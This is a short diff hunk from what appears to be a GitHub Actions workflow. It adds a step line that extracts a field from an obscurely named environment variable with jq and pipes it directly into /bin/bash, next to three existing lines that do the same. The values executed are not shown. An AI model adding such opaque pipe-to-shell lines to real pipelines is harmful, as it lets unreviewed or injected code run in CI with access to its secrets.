@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$vhemr3810" | jq -r .pbpo63303 | /bin/bash
           echo $lvdf3 | jq -r .uz5078 | /bin/bash
           printf '%s' "$d1253" | jq -r .dsln7165 | /bin/bash
+          printf '%s' "$p6" | jq -r .byphj07 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
